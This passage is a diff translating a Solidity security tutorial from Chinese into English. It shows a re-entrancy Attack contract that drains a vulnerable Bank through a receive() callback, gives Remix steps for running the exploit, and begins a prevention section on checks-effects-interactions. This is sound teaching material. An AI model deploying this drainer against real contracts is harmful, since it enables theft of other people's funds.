@@ -120,49 +120,49 @@ Next, let’s take a look at the attack contract. Its logic is very simple. It u
 
 ```solidity
 contract Attack {
-    Bank public bank; // Bank合约地址
+    Bank public bank; // Bank contract address
 
-    // 初始化Bank合约地址
+    // Initialize Bank contract address
     constructor(Bank _bank) {
         bank = _bank;
     }
     
-    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
+    // Callback function, used for re-entrancy attack on Bank contract, repeatedly calling the target’s withdraw function
     receive() external payable {
         if (bank.getBalance() >= 1 ether) {
             bank.withdraw();
         }
     }
 
-    // 攻击函数，调用时 msg.value 设为 1 ether
+    // Attack function, when called, set msg.value to 1 ether
     function attack() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         bank.deposit{value: 1 ether}();
         bank.withdraw();
     }
 
-    // 获取本合约的余额
+    // Get the balance of this contract
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 ```
 
-## `Remix`演示
+## `Remix` Demonstration
 
-1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
-2. 切换到攻击者钱包，部署`Attack`合约。
-3. 调用`Atack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
-4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
-5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。
+1. Deploy the `Bank` contract, call the `deposit()` function, and transfer `20 ETH`.
+2. Switch to the attacker's wallet and deploy the `Attack` contract.
+3. Call the `attack()` function of the `Attack` contract to launch an attack, and transfer `1 ETH` when calling.
+4. Call the `getBalance()` function of the `Bank` contract and find that the balance has been emptied.
+5. Call the `getBalance()` function of the `Attack` contract and see that the balance has become `21 ETH`, and the re-entrancy attack is successful.
 
-## 预防办法
+## Prevention methods
 
-目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。
+Currently, there are mainly two methods to prevent possible re-entrancy attack vulnerabilities: the checks-effects-interaction pattern and re-entrancy locks.
 
-### 检查-影响-交互模式
+### Checks-Effects-Interaction pattern
 
-检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：
+The checks-effects-interaction pattern emphasizes that when writing functions, you should first check whether the state variables meet the requirements, then update the state variables (such as balance), and finally interact with other contracts. If we move the update of the balance in the `withdraw()` function of the `Bank` contract to before transferring `ETH`, we can fix the vulnerability:
 
 ```solidity 
 function withdraw() external {
